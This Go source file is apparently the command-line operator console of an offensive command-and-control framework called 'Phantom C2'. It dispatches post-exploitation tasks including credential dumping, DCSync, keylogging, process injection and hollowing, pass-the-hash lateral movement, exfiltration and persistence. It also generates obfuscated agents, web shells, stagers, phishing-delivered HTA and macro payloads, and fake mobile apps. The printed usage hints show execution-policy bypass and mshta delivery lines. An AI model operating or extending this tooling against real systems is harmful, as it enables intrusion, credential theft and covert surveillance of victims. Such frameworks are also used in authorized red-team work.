package cli

import (
	"bufio"
	"fmt"
	"os"
	"os/signal"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"time"

	"github.com/google/uuid"
	"github.com/peterh/liner"
	"github.com/phantom-c2/phantom/internal/agent"
	"github.com/phantom-c2/phantom/internal/listener"
	"github.com/phantom-c2/phantom/internal/webui"
	"github.com/phantom-c2/phantom/internal/db"
	"github.com/phantom-c2/phantom/internal/payloads"
	"github.com/phantom-c2/phantom/internal/protocol"
	"github.com/phantom-c2/phantom/internal/server"
	"github.com/phantom-c2/phantom/internal/util"
)

const historyFile = ".phantom_history"

// Global commands available at the main prompt.
var globalCommands = []string{
	"agents", "interact", "listeners", "tasks", "generate",
	"remove", "loot", "report", "webui", "webhook", "doctor", "diagnostics",
	"troubleshoot", "version", "events", "clear", "help", "exit",
	"build", "payload",
}

// Agent commands available when interacting with an agent.
var agentCommands = []string{
	"shell", "exec", "cmd", "upload", "download", "screenshot",
	"ps", "sysinfo", "ifconfig", "ipconfig", "persist", "sleep", "cd", "kill",
	"bof", "shellcode", "inject", "hollow", "evasion", "pivot",
	"assembly", "lateral", "exfil", "initaccess",
	"wmiexec", "winrm", "psexec", "pth", "portscan", "spray", "netdiscover",
	"token", "keylog", "socks", "portfwd", "creds",
	"info", "tasks", "back", "help",
	"ad-help", "ad-enum-domain", "ad-enum-users", "ad-enum-groups",
	"ad-enum-computers", "ad-enum-shares", "ad-enum-spns",
	"ad-enum-gpo", "ad-enum-trusts", "ad-enum-admins",
	"ad-enum-asrep", "ad-enum-delegation", "ad-enum-laps",
	"ad-kerberoast", "ad-asreproast", "ad-dcsync",
	"ad-dump-sam", "ad-dump-lsa", "ad-dump-tickets",
	"ad-psexec", "ad-wmi", "ad-winrm", "ad-pass-the-hash",
	"token", "keylog", "socks", "portfwd", "creds",
}

// Shell is the interactive CLI shell for Phantom.
type Shell struct {
	server      *server.Server
	scanner     *bufio.Scanner
	liner       *liner.State
	activeAgent *db.Agent // currently interacting agent
	running     bool
	sessionLog  *os.File  // session recording
}

// NewShell creates a new CLI shell.
func NewShell(srv *server.Server) *Shell {
	return &Shell{
		server:  srv,
		scanner: bufio.NewScanner(os.Stdin),
		running: true,
	}
}

// Run starts the interactive shell loop with readline support.
func (sh *Shell) Run() {
	// Handle Ctrl+C gracefully
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		fmt.Println()
		Info("Shutting down...")
		sh.cleanup()
		sh.server.Shutdown()
		os.Exit(0)
	}()

	// Register event handler for live notifications
	sh.server.OnEvent = sh.onEvent

	// Start session recording
	sh.startSessionLog()

	defer sh.cleanup()

	// Use basic mode directly — most reliable across all terminals
	// Liner/readline has issues with terminal state after password prompts on WSL
	sh.runBasicMode()
}

// runBasicMode is the fallback shell using bufio.Scanner when liner fails.
// No tab completion or arrow keys, but reliable on all terminals.
func (sh *Shell) runBasicMode() {
	Info("Basic mode: no tab completion (type 'help' for commands)")

	// Open /dev/tty directly as a fresh input source
	// This bypasses the corrupted os.Stdin from term.ReadPassword
	input := os.Stdin
	tty, err := os.Open("/dev/tty")
	if err == nil {
		input = tty
		defer tty.Close()
	}
	scanner := bufio.NewScanner(input)

	for sh.running {
		prompt := sh.getPrompt()
		fmt.Print(prompt)

		if !scanner.Scan() {
			break
		}

		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}

		sh.logCommand(line)
		sh.execute(line)
	}
}

// getPrompt returns the current prompt string.
func (sh *Shell) getPrompt() string {
	if sh.activeAgent != nil {
		return "\n  " + FormatPrompt(sh.activeAgent.Name)
	}
	return "\n  " + FormatPrompt("")
}

// completer provides tab completion for commands and arguments.
func (sh *Shell) completer(line string) []string {
	var candidates []string

	parts := strings.Fields(line)
	prefix := line

	if sh.activeAgent != nil {
		// Agent mode completion
		if len(parts) <= 1 {
			// Complete the command itself
			for _, cmd := range agentCommands {
				if strings.HasPrefix(cmd, strings.ToLower(prefix)) {
					candidates = append(candidates, cmd)
				}
			}
		} else {
			// Complete arguments
			cmd := strings.ToLower(parts[0])
			argPrefix := ""
			if len(parts) > 1 {
				argPrefix = parts[len(parts)-1]
			}
			if !strings.HasSuffix(line, " ") {
				argPrefix = parts[len(parts)-1]
			} else {
				argPrefix = ""
			}

			switch cmd {
			case "persist":
				methods := []string{"registry", "schtask", "cron", "service", "bashrc"}
				for _, m := range methods {
					if strings.HasPrefix(m, argPrefix) {
						candidates = append(candidates, strings.Join(parts[:len(parts)-1], " ")+" "+m)
					}
				}
			case "pivot":
				actions := []string{"start", "stop", "list"}
				for _, a := range actions {
					if strings.HasPrefix(a, argPrefix) {
						candidates = append(candidates, "pivot "+a)
					}
				}
			case "generate":
				types := []string{"exe", "elf", "exe-garble", "elf-garble", "android", "ios", "aspx", "php", "jsp", "powershell", "bash", "python", "hta", "vba"}
				for _, t := range types {
					if strings.HasPrefix(t, argPrefix) {
						candidates = append(candidates, "generate "+t)
					}
				}
			}
		}
	} else {
		// Global mode completion
		if len(parts) <= 1 {
			for _, cmd := range globalCommands {
				if strings.HasPrefix(cmd, strings.ToLower(prefix)) {
					candidates = append(candidates, cmd)
				}
			}
		} else {
			cmd := strings.ToLower(parts[0])
			argPrefix := ""
			if !strings.HasSuffix(line, " ") && len(parts) > 1 {
				argPrefix = parts[len(parts)-1]
			}

			switch cmd {
			case "interact", "use", "remove", "rm":
				// Complete with agent names
				agents, _ := sh.server.AgentMgr.List()
				for _, a := range agents {
					if strings.HasPrefix(a.Name, argPrefix) {
						candidates = append(candidates, cmd+" "+a.Name)
					}
				}
			case "listeners":
				actions := []string{"start", "stop"}
				for _, a := range actions {
					if strings.HasPrefix(a, argPrefix) {
						candidates = append(candidates, "listeners "+a)
					}
				}
				// Also complete listener names for start/stop
				if len(parts) >= 2 && (parts[1] == "start" || parts[1] == "stop") {
					listeners := sh.server.ListenerMgr.List()
					for _, l := range listeners {
						if strings.HasPrefix(l.Name, argPrefix) {
							candidates = append(candidates, "listeners "+parts[1]+" "+l.Name)
						}
					}
				}
			case "generate", "build", "payload":
				types := []string{"exe", "elf", "exe-garble", "elf-garble", "android", "ios", "aspx", "php", "jsp", "powershell", "bash", "python", "hta", "vba"}
				for _, t := range types {
					if strings.HasPrefix(t, argPrefix) {
						candidates = append(candidates, "generate "+t)
					}
				}
			}
		}
	}

	return candidates
}

// printPrompt displays the CLI prompt (used by event callbacks).
func (sh *Shell) printPrompt() {
	// When using liner, we don't manually print prompts
	// — liner handles prompt display. This is only for event notifications.
}

// ──────── History ────────

func (sh *Shell) loadHistory() {
	histPath := sh.historyPath()
	f, err := os.Open(histPath)
	if err != nil {
		return
	}
	defer f.Close()
	sh.liner.ReadHistory(f)
}

func (sh *Shell) saveHistory() {
	histPath := sh.historyPath()
	f, err := os.Create(histPath)
	if err != nil {
		return
	}
	defer f.Close()
	sh.liner.WriteHistory(f)
}

func (sh *Shell) historyPath() string {
	home, err := os.UserHomeDir()
	if err != nil {
		return historyFile
	}
	return filepath.Join(home, historyFile)
}

// ──────── Session Recording ────────

func (sh *Shell) startSessionLog() {
	os.MkdirAll("logs", 0755)
	logName := fmt.Sprintf("logs/session_%s.log", time.Now().Format("2006-01-02_150405"))
	f, err := os.Create(logName)
	if err != nil {
		return
	}
	sh.sessionLog = f
	fmt.Fprintf(f, "# Phantom C2 Session Log\n")
	fmt.Fprintf(f, "# Started: %s\n\n", time.Now().Format(time.RFC3339))
	Info("Session recording: %s", logName)
}

func (sh *Shell) logCommand(line string) {
	if sh.sessionLog == nil {
		return
	}
	timestamp := time.Now().Format("15:04:05")
	prompt := "phantom"
	if sh.activeAgent != nil {
		prompt = fmt.Sprintf("phantom [%s]", sh.activeAgent.Name)
	}
	fmt.Fprintf(sh.sessionLog, "[%s] %s > %s\n", timestamp, prompt, line)
}

func (sh *Shell) logOutput(output string) {
	if sh.sessionLog == nil {
		return
	}
	for _, line := range strings.Split(output, "\n") {
		fmt.Fprintf(sh.sessionLog, "  %s\n", line)
	}
}

func (sh *Shell) cleanup() {
	if sh.liner != nil {
		sh.saveHistory()
		sh.liner.Close()
	}
	if sh.sessionLog != nil {
		fmt.Fprintf(sh.sessionLog, "\n# Ended: %s\n", time.Now().Format(time.RFC3339))
		sh.sessionLog.Close()
	}
}

// execute dispatches a command.
func (sh *Shell) execute(line string) {
	parts := strings.Fields(line)
	if len(parts) == 0 {
		return
	}

	cmd := strings.ToLower(parts[0])
	args := parts[1:]

	// If interacting with an agent, handle agent commands
	if sh.activeAgent != nil {
		sh.executeAgentCmd(cmd, args)
		return
	}

	// Global commands
	switch cmd {
	case "help", "?":
		sh.cmdHelp()
	case "agents", "sessions":
		sh.cmdAgents()
	case "interact", "use":
		sh.cmdInteract(args)
	case "listeners":
		sh.cmdListeners(args)
	case "tasks":
		sh.cmdTasks(args)
	case "generate", "payload", "build":
		sh.cmdGenerate(args)
	case "events", "log":
		sh.cmdEvents()
	case "remove", "rm":
		sh.cmdRemoveAgent(args)
	case "loot":
		sh.cmdLoot(args)
	case "doctor", "diag", "diagnostics", "troubleshoot":
		RunDiagnostics(sh.server)
	case "version":
		sh.cmdVersion()
	case "report":
		sh.cmdReport(args)
	case "webui":
		sh.cmdWebUI(args)
	case "webhook":
		sh.cmdWebhook(args)
	case "redirector":
		sh.cmdRedirector(args)
	case "clear", "cls":
		fmt.Print("\033[H\033[2J")
	case "exit", "quit":
		Info("Shutting down...")
		sh.server.Shutdown()
		sh.running = false
	default:
		Error("Unknown command: %s (type 'help' for available commands)", cmd)
	}
}

// executeAgentCmd handles commands within an agent interaction.
func (sh *Shell) executeAgentCmd(cmd string, args []string) {
	switch cmd {
	case "help", "?":
		sh.cmdAgentHelp()
	case "back", "bg", "exit":
		Info("Returning to main menu")
		sh.activeAgent = nil
	case "info":
		sh.cmdAgentInfo()
	case "shell", "exec", "cmd":
		sh.cmdShell(args)
	case "upload":
		sh.cmdUpload(args)
	case "download":
		sh.cmdDownload(args)
	case "screenshot":
		sh.cmdScreenshot()
	case "ps":
		sh.cmdProcessList()
	case "sysinfo":
		sh.cmdSysinfo()
	case "ifconfig", "ipconfig":
		sh.cmdIfconfig()
	case "persist":
		sh.cmdPersist(args)
	case "sleep":
		sh.cmdSleep(args)
	case "cd":
		sh.cmdCd(args)
	case "kill":
		sh.cmdKill()
	case "tasks":
		sh.cmdAgentTasks()
	case "bof":
		sh.cmdBOF(args)
	case "shellcode":
		sh.cmdShellcode(args)
	case "inject":
		sh.cmdInject(args)
	case "hollow":
		sh.cmdHollow(args)
	case "evasion":
		sh.cmdEvasion()
	case "pivot":
		sh.cmdPivot(args)
	case "token":
		sh.cmdToken(args)
	case "keylog":
		sh.cmdKeylog(args)
	case "socks":
		sh.cmdSocks(args)
	case "portfwd":
		sh.cmdPortFwd(args)
	case "creds":
		sh.cmdCreds(args)
	case "lateral", "wmiexec", "winrm", "psexec", "pth":
		if cmd != "lateral" {
			args = append([]string{cmd}, args...)
		}
		sh.queueTask(protocol.TaskLateral, args, nil)
	case "exfil":
		sh.queueTask(protocol.TaskExfil, args, nil)
	case "assembly":
		sh.cmdAssembly(args)
	case "initaccess", "portscan", "spray", "netdiscover":
		if cmd != "initaccess" {
			args = append([]string{cmd}, args...)
		}
		sh.queueTask(protocol.TaskInitAccess, args, nil)
	default:
		// Check if it's an AD command
		if strings.HasPrefix(cmd, "ad-") {
			sh.cmdAD(cmd, args)
			return
		}
		// Treat as shell command
		sh.cmdShell(append([]string{cmd}, args...))
	}
}

// ─────────────── Global Commands ───────────────

func (sh *Shell) cmdHelp() {
	fmt.Println()
	fmt.Printf("  %s%s╔══════════════════════════════════════════════════════════╗%s\n", colorBold, colorPurple, colorReset)
	fmt.Printf("  %s%s║             ⚡  PHANTOM C2 — COMMAND REFERENCE           ║%s\n", colorBold, colorPurple, colorReset)
	fmt.Printf("  %s%s╚══════════════════════════════════════════════════════════╝%s\n", colorBold, colorPurple, colorReset)
	fmt.Println()

	sections := []struct {
		title string
		icon  string
		cmds  [][]string
	}{
		{"Core", "🔧", [][]string{
			{"agents", "List all connected agents"},
			{"interact <name>", "Interact with an agent"},
			{"back", "Deselect current agent"},
			{"remove <name>", "Remove a dead agent"},
			{"clear", "Clear screen"},
			{"exit", "Shutdown and exit"},
		}},
		{"Infrastructure", "🌐", [][]string{
			{"listeners [start|stop]", "Manage C2 listeners"},
			{"webui [addr]", "Start web dashboard"},
			{"webhook <type> <url>", "Set Slack/Discord notifications"},
			{"redirector <domain> <ip>", "Generate redirector configs"},
		}},
		{"Payloads", "📦", [][]string{
			{"generate exe [url]", "Windows agent (.exe)"},
			{"generate elf [url]", "Linux agent (ELF)"},
			{"generate android [url]", "Android APK with C2 callback"},
			{"generate ios [url]", "iOS phishing + MDM profile"},
			{"generate app <template>", "Fake mobile app (30+ templates)"},
			{"generate <php|aspx|jsp>", "Web shells"},
			{"generate <ps|bash|python>", "Stagers"},
		}},
		{"Post-Exploitation", "⚔️", [][]string{
			{"shell <cmd>", "Execute shell command"},
			{"sysinfo", "Device/system information"},
			{"ps", "Process list"},
			{"cd <path>", "Change directory"},
			{"download <path>", "Download file from target"},
			{"upload <local> <remote>", "Upload file to target"},
			{"screenshot", "Capture screen"},
			{"location", "GPS / cell location (mobile)"},
			{"clipboard", "Clipboard contents (mobile)"},
			{"fileget <path>", "Base64 file download (mobile)"},
		}},
		{"Credential Access", "🔑", [][]string{
			{"creds [all|mimikatz|sam]", "Harvest credentials"},
			{"token [steal|info|revert]", "Token manipulation"},
			{"keylog [seconds]", "Keylogger"},
		}},
		{"Lateral Movement", "🔀", [][]string{
			{"lateral wmiexec <ip> ...", "WMI execution"},
			{"lateral winrm <ip> ...", "WinRM execution"},
			{"lateral psexec <ip> ...", "PsExec execution"},
			{"socks [start|stop|list]", "SOCKS5 proxy"},
			{"portfwd <local> <remote>", "TCP port forwarding"},
		}},
		{"Intel & Reporting", "📊", [][]string{
			{"tasks [agent]", "View task history"},
			{"loot [agent]", "View captured loot"},
			{"events", "View event log"},
			{"report [md|csv|all]", "Generate engagement report"},
			{"doctor", "Run diagnostics"},
			{"version", "Version info"},
		}},
	}

	for _, s := range sections {
		fmt.Printf("  %s%s %s %s%s\n", colorBold+colorYellow, s.icon, s.title, colorReset, "")
		for _, c := range s.cmds {
			fmt.Printf("    %s%-28s%s %s%s%s\n", colorCyan, c[0], colorReset, colorDim, c[1], colorReset)
		}
		fmt.Println()
	}
}

func (sh *Shell) cmdAgents() {
	agents, err := sh.server.AgentMgr.List()
	if err != nil {
		Error("Failed to list agents: %v", err)
		return
	}

	if len(agents) == 0 {
		Warn("No agents connected")
		return
	}

	// Refresh statuses
	sh.server.AgentMgr.RefreshStatuses()
	agents, _ = sh.server.AgentMgr.List()

	t := NewTable("ID", "Name", "OS", "Hostname", "User", "IP", "Sleep", "Last Seen", "Status")
	t.Title = fmt.Sprintf("⚡ AGENTS (%d connected)", len(agents))
	for _, a := range agents {
		t.AddRow(
			util.ShortID(a.ID),
			a.Name,
			a.OS,
			a.Hostname,
			a.Username,
			a.ExternalIP,
			fmt.Sprintf("%ds/%d%%", a.Sleep, a.Jitter),
			util.TimeAgo(a.LastSeen),
			a.Status,
		)
	}
	fmt.Println()
	t.Render()
}

func (sh *Shell) cmdInteract(args []string) {
	if len(args) == 0 {
		Error("Usage: interact <agent-name|agent-id>")
		return
	}

	agent, err := sh.server.AgentMgr.Get(args[0])
	if err != nil {
		Error("Error: %v", err)
		return
	}
	if agent == nil {
		Error("Agent not found: %s", args[0])
		return
	}

	sh.activeAgent = agent
	osIcon := "🐧"
	switch agent.OS {
	case "windows":
		osIcon = "🪟"
	case "android":
		osIcon = "📱"
	case "ios":
		osIcon = "🍎"
	}
	fmt.Println()
	fmt.Printf("  %s%s╭─ %s Session: %s ─╮%s\n", colorBold, colorGreen, osIcon, agent.Name, colorReset)
	fmt.Printf("  %s%s│%s  %s@%s (%s/%s)%s\n", colorBold, colorGreen, colorReset, agent.Username, agent.Hostname, agent.OS, agent.Arch, colorReset)
	fmt.Printf("  %s%s│%s  IP: %s%s%s  Sleep: %ds/%d%%%s\n", colorBold, colorGreen, colorReset, colorCyan, agent.ExternalIP, colorReset, agent.Sleep, agent.Jitter, colorReset)
	fmt.Printf("  %s%s╰─ Type 'help' for commands ─╯%s\n", colorBold, colorGreen, colorReset)
}

func (sh *Shell) cmdListeners(args []string) {
	if len(args) == 0 {
		// List all listeners
		listeners := sh.server.ListenerMgr.List()
		if len(listeners) == 0 {
			Warn("No listeners configured")
			return
		}

		t := NewTable("Name", "Type", "Bind Address", "Status")
		t.Title = "🌐 LISTENERS"
		for _, l := range listeners {
			status := "stopped"
			if l.IsRunning() {
				status = "running"
			}
			t.AddRow(l.Name, strings.ToUpper(l.Type), l.BindAddr, status)
		}
		fmt.Println()
		t.Render()
		return
	}

	action := strings.ToLower(args[0])
	switch action {
	case "start":
		if len(args) < 2 {
			Error("Usage: listeners start <name>")
			return
		}
		if err := sh.server.StartListener(args[1]); err != nil {
			Error("Failed to start listener: %v", err)
		} else {
			Success("Listener %s started", args[1])
		}
	case "stop":
		if len(args) < 2 {
			Error("Usage: listeners stop <name>")
			return
		}
		if err := sh.server.StopListener(args[1]); err != nil {
			Error("Failed to stop listener: %v", err)
		} else {
			Success("Listener %s stopped", args[1])
		}
	case "add":
		// listeners add <name> <type> <bind> [profile]
		if len(args) < 4 {
			Error("Usage: listeners add <name> <http|https> <bind-addr> [profile]")
			Info("  Example: listeners add my-http http 0.0.0.0:8443")
			Info("  Example: listeners add my-https https 0.0.0.0:443 microsoft")
			return
		}
		name := args[1]
		typ := strings.ToLower(args[2])
		bind := args[3]
		profile := "default"
		if len(args) > 4 {
			profile = args[4]
		}
		if err := sh.server.CreateListener(name, typ, bind, profile, "", ""); err != nil {
			Error("Failed to create listener: %v", err)
		} else {
			Success("Listener '%s' created (%s on %s, profile: %s)", name, typ, bind, profile)
			Info("Use 'listeners start %s' to start it", name)
		}
	case "save":
		// listeners save <name> <type> <bind> [profile] — save as preset
		if len(args) < 4 {
			Error("Usage: listeners save <name> <http|https> <bind-addr> [profile]")
			Info("  Example: listeners save lab-http http 172.20.41.154:8080")
			Info("  Saved presets persist across restarts")
			return
		}
		name := args[1]
		typ := strings.ToLower(args[2])
		bind := args[3]
		profile := "default"
		if len(args) > 4 {
			profile = args[4]
		}
		p := &db.ListenerPreset{
			ID: uuid.New().String(), Name: name, Type: typ,
			BindAddr: bind, Profile: profile, CreatedAt: time.Now(),
		}
		if err := sh.server.DB.InsertPreset(p); err != nil {
			Error("Failed to save preset: %v", err)
		} else {
			Success("Preset '%s' saved (%s %s, profile: %s)", name, typ, bind, profile)
		}
	case "presets":
		presets, err := sh.server.DB.ListPresets()
		if err != nil || len(presets) == 0 {
			Warn("No saved presets")
			Info("Save one: listeners save <name> <http|https> <bind>")
			return
		}
		t := NewTable("Name", "Type", "Bind Address", "Profile")
		for _, p := range presets {
			t.AddRow(p.Name, strings.ToUpper(p.Type), p.BindAddr, p.Profile)
		}
		fmt.Println()
		t.Render()
	case "use":
		// listeners use <preset-name> — create + start listener from preset
		if len(args) < 2 {
			Error("Usage: listeners use <preset-name>")
			return
		}
		preset, err := sh.server.DB.GetPresetByName(args[1])
		if err != nil || preset == nil {
			Error("Preset '%s' not found. Run 'listeners presets' to see saved presets", args[1])
			return
		}
		if err := sh.server.CreateListener(preset.Name, preset.Type, preset.BindAddr, preset.Profile, preset.TLSCert, preset.TLSKey); err != nil {
			Error("Failed to create listener from preset: %v", err)
			return
		}
		if err := sh.server.StartListener(preset.Name); err != nil {
			Error("Listener created but failed to start: %v", err)
			return
		}
		Success("Listener '%s' started from preset (%s on %s)", preset.Name, preset.Type, preset.BindAddr)
	case "unsave":
		if len(args) < 2 {
			Error("Usage: listeners unsave <preset-name>")
			return
		}
		if err := sh.server.DB.DeletePreset(args[1]); err != nil {
			Error("Failed to remove preset: %v", err)
		} else {
			Success("Preset '%s' removed", args[1])
		}
	default:
		Error("Unknown action: %s", action)
		Info("Usage: listeners [start|stop|add|save|presets|use|unsave]")
	}
}

func (sh *Shell) cmdTasks(args []string) {
	agentID := ""
	if len(args) > 0 {
		a, err := sh.server.AgentMgr.Get(args[0])
		if err != nil || a == nil {
			Error("Agent not found: %s", args[0])
			return
		}
		agentID = a.ID
	}

	var allTasks []*db.TaskRecord
	if agentID != "" {
		tasks, err := sh.server.TaskDisp.GetTaskHistory(agentID)
		if err != nil {
			Error("Failed to get tasks: %v", err)
			return
		}
		allTasks = tasks
	} else {
		// Get tasks for all agents
		agents, _ := sh.server.AgentMgr.List()
		for _, a := range agents {
			tasks, _ := sh.server.TaskDisp.GetTaskHistory(a.ID)
			allTasks = append(allTasks, tasks...)
		}
	}

	if len(allTasks) == 0 {
		Warn("No tasks found")
		return
	}

	t := NewTable("ID", "Agent", "Type", "Args", "Status", "Created")
	t.Title = "📋 TASKS"
	for _, task := range allTasks {
		agentName := util.ShortID(task.AgentID)
		a, _ := sh.server.AgentMgr.Get(task.AgentID)
		if a != nil {
			agentName = a.Name
		}

		argsStr := strings.Join(task.Args, " ")
		if len(argsStr) > 30 {
			argsStr = argsStr[:27] + "..."
		}

		t.AddRow(
			util.ShortID(task.ID),
			agentName,
			protocol.TaskTypeName(uint8(task.Type)),
			argsStr,
			protocol.StatusName(uint8(task.Status)),
			util.TimeAgo(task.CreatedAt),
		)
	}
	fmt.Println()
	t.Render()
}

func (sh *Shell) cmdGenerate(args []string) {
	fmt.Println()
	fmt.Printf("  %s%sPayload Generator%s\n", colorBold, colorPurple, colorReset)
	fmt.Printf("  %s─────────────────────────────────────────────────────────%s\n", colorDim, colorReset)
	fmt.Println()

	fmt.Printf("  %sAgent Binaries (cross-compiled, built from CLI):%s\n", colorYellow, colorReset)
	fmt.Printf("    %s%-35s%s %s%s%s\n", colorCyan, "generate exe [listener_url]", colorReset, colorDim, "Windows EXE agent (amd64)", colorReset)
	fmt.Printf("    %s%-35s%s %s%s%s\n", colorCyan, "generate elf [listener_url]", colorReset, colorDim, "Linux ELF agent (amd64)", colorReset)
	fmt.Printf("    %s%-35s%s %s%s%s\n", colorCyan, "generate exe-garble [listener_url]", colorReset, colorDim, "Obfuscated Windows EXE (garble)", colorReset)
	fmt.Printf("    %s%-35s%s %s%s%s\n", colorCyan, "generate elf-garble [listener_url]", colorReset, colorDim, "Obfuscated Linux ELF (garble)", colorReset)
	fmt.Println()

	fmt.Printf("  %sMobile Payloads:%s\n", colorYellow, colorReset)
	fmt.Printf("    %s%-35s%s %s%s%s\n", colorCyan, "generate android [listener_url]", colorReset, colorDim, "Android stager + Termux agent + phishing page", colorReset)
	fmt.Printf("    %s%-35s%s %s%s%s\n", colorCyan, "generate ios [listener_url]", colorReset, colorDim, "iOS MDM profile + Shortcut + Apple ID phishing", colorReset)
	fmt.Printf("    %s%-35s%s %s%s%s\n", colorCyan, "generate app <template> [url]", colorReset, colorDim, "Build fake mobile app (30+ templates)", colorReset)
	fmt.Printf("    %s%-35s%s %s%s%s\n", colorCyan, "generate app list", colorReset, colorDim, "Show all available app templates", colorReset)
	fmt.Println()

	fmt.Printf("  %sWeb Shells (stealthy, token-protected):%s\n", colorYellow, colorReset)
	pTypes := payloads.ListPayloadTypes()
	for _, pt := range pTypes {
		fmt.Printf("    %s%-35s%s %s%s%s\n", colorCyan, fmt.Sprintf("generate %s [listener_url]", pt.Type), colorReset, colorDim, pt.Desc, colorReset)
	}
	fmt.Println()

	// Handle generation if args provided
	if len(args) == 0 {
		return
	}

	pType := strings.ToLower(args[0])
	listenerURL := "https://127.0.0.1:443"
	if len(args) > 1 {
		listenerURL = args[1]
	}

	// Agent binaries — build directly
	switch pType {
	case "exe":
		sh.buildAgent("windows", "amd64", listenerURL, false)
		return
	case "elf":
		sh.buildAgent("linux", "amd64", listenerURL, false)
		return
	case "exe-garble":
		sh.buildAgent("windows", "amd64", listenerURL, true)
		return
	case "elf-garble":
		sh.buildAgent("linux", "amd64", listenerURL, true)
		return
	case "android":
		output, err := payloads.GenerateAndroidPayload(listenerURL, "build/payloads")
		if err != nil {
			Error("Failed: %v", err)
		} else {
			Success("Android payloads generated:")
			fmt.Print(output)
		}
		return
	case "ios":
		output, err := payloads.GenerateIOSPayload(listenerURL, "build/payloads")
		if err != nil {
			Error("Failed: %v", err)
		} else {
			Success("iOS payloads generated:")
			fmt.Print(output)
		}
		return
	case "app":
		if len(args) < 2 {
			fmt.Print(payloads.ListAppTemplates())
			return
		}
		templateName := args[1]
		if templateName == "list" {
			fmt.Print(payloads.ListAppTemplates())
			return
		}
		appURL := listenerURL
		if len(args) > 2 {
			appURL = args[2]
		}
		output, err := payloads.BuildMobileApp(templateName, appURL, "build/payloads/apps")
		if err != nil {
			Error("%v", err)
		} else {
			Success("Mobile app generated:")
			fmt.Print(output)
		}
		return
	}

	// Web shells and stagers
	cfg := payloads.PayloadConfig{
		Type:        payloads.PayloadType(pType),
		ListenerURL: listenerURL,
		OutputPath:  "build/payloads",
	}

	outPath, err := payloads.Generate(cfg)
	if err != nil {
		Error("Failed to generate payload: %v", err)
		return
	}

	Success("Payload generated: %s", outPath)

	// Show access instructions for web shells
	switch payloads.PayloadType(pType) {
	case payloads.PayloadASPX, payloads.PayloadPHP, payloads.PayloadJSP:
		token := fmt.Sprintf("%016x", hashString(listenerURL))
		Info("Upload to target web server, then access with:")
		fmt.Printf("  %scurl -X POST -H 'X-Debug-Token: %s' -d 'data=whoami' <url>%s\n", colorCyan, token, colorReset)
	case payloads.PayloadPowerShell:
		Info("Execute on target: powershell -ep bypass -f update.ps1")
	case payloads.PayloadBash:
		Info("Execute on target: bash update.sh")
	case payloads.PayloadPython:
		Info("Execute on target: python3 config.py")
	case payloads.PayloadHTA:
		Info("Deliver via phishing: mshta <url>/update.hta")
	case payloads.PayloadVBA:
		Info("Embed in Office document macro (AutoOpen)")
	}
}

func (sh *Shell) buildAgent(targetOS, arch, listenerURL string, obfuscate bool) {
	Info("Building %s/%s agent...", targetOS, arch)
	if obfuscate {
		Info("Obfuscation: garble (literals + tiny)")
	}

	cfg := agent.BuildConfig{
		OS:          targetOS,
		Arch:        arch,
		ListenerURL: listenerURL,
		Sleep:       sh.server.Config.Server.DefaultSleep,
		Jitter:      sh.server.Config.Server.DefaultJitter,
		ServerPub:   sh.server.PubKey,
		OutputDir:   "build/agents",
		Obfuscate:   obfuscate,
	}

	result, err := agent.BuildAgent(cfg)
	if err != nil {
		Error("Build failed: %v", err)
		return
	}

	Success("Agent built successfully!")
	fmt.Printf("  %-12s %s\n", "Output:", result.OutputPath)
	fmt.Printf("  %-12s %s\n", "Size:", agent.FormatSize(result.Size))
	fmt.Printf("  %-12s %s/%s\n", "Platform:", result.OS, result.Arch)
	fmt.Printf("  %-12s %s\n", "Listener:", listenerURL)
	fmt.Printf("  %-12s %ds / %d%%\n", "Sleep:", cfg.Sleep, cfg.Jitter)
	if obfuscate {
		fmt.Printf("  %-12s %s\n", "Obfuscation:", "garble (literals stripped)")
	}
	fmt.Println()
}

func hashString(s string) uint64 {
	h := uint64(0)
	for _, c := range s {
		h = h*31 + uint64(c)
	}
	return h
}

func (sh *Shell) cmdRemoveAgent(args []string) {
	if len(args) == 0 {
		Error("Usage: remove <agent-name|agent-id>")
		return
	}

	a, err := sh.server.AgentMgr.Get(args[0])
	if err != nil || a == nil {
		Error("Agent not found: %s", args[0])
		return
	}

	answer, err := sh.liner.Prompt(fmt.Sprintf("  [!] Remove agent '%s' (%s@%s)? (y/N): ", a.Name, a.Username, a.Hostname))
	if err == nil && strings.ToLower(strings.TrimSpace(answer)) == "y" {
		if err := sh.server.AgentMgr.Remove(a.ID); err != nil {
			Error("Failed to remove: %v", err)
			return
		}
		Success("Agent '%s' removed", a.Name)
	}
}

func (sh *Shell) cmdLoot(args []string) {
	agentID := ""
	if len(args) > 0 {
		a, err := sh.server.AgentMgr.Get(args[0])
		if err != nil || a == nil {
			Error("Agent not found: %s", args[0])
			return
		}
		agentID = a.ID
	}

	loot, err := sh.server.DB.ListLoot(agentID)
	if err != nil {
		Error("Failed to list loot: %v", err)
		return
	}

	if len(loot) == 0 {
		Warn("No loot captured yet")
		return
	}

	t := NewTable("ID", "Agent", "Type", "Name", "Created")
	t.Title = "💎 LOOT"
	for _, l := range loot {
		agentName := util.ShortID(l.AgentID)
		a, _ := sh.server.AgentMgr.Get(l.AgentID)
		if a != nil {
			agentName = a.Name
		}
		t.AddRow(util.ShortID(l.ID), agentName, l.Type, l.Name, util.TimeAgo(l.CreatedAt))
	}
	fmt.Println()
	t.Render()
}

func (sh *Shell) cmdReport(args []string) {
	format := "md"
	if len(args) > 0 {
		format = strings.ToLower(args[0])
	}

	rg := NewReportGenerator(sh.server)

	switch format {
	case "md", "markdown":
		err := rg.GenerateReport("")
		if err != nil {
			Error("Failed to generate report: %v", err)
			return
		}
		Success("Markdown report generated in reports/ directory")
	case "csv":
		err := rg.GenerateCSV("")
		if err != nil {
			Error("Failed to generate CSV: %v", err)
			return
		}
		Success("CSV report generated in reports/ directory")
	case "all":
		rg.GenerateReport("")
		rg.GenerateCSV("")
		Success("Markdown + CSV reports generated in reports/ directory")
	default:
		Error("Unknown format: %s (use: md, csv, all)", format)
	}
}

func (sh *Shell) cmdWebUI(args []string) {
	addr := "127.0.0.1:3000"
	if len(args) > 0 {
		addr = args[0]
	}

	ui := webui.New(sh.server, addr)
	go func() {
		if err := ui.Start(); err != nil {
			Error("Web UI failed: %v", err)
		}
	}()

	Success("Web UI started: http://%s", addr)
	Info("Open in your browser to view the dashboard")
}

func (sh *Shell) cmdRedirector(args []string) {
	if len(args) < 2 {
		fmt.Println()
